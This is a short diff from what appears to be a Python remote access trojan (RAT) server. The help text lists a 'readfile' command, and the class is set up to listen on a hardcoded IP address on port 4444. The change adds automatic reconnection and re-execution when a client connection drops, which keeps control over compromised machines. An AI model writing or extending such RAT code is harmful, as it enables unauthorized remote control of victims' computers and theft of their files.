@@ -470,7 +470,9 @@ readfile <file>           read from file
                 else:
                     print('Unacceptable server command')
             except:
-                print("Something didn't work...")
+                print("Client connection lost.")
+                rat.build_connection()
+                rat.execute()
 
 
 rat = RAT_SERVER('50.116.8.102', 4444)
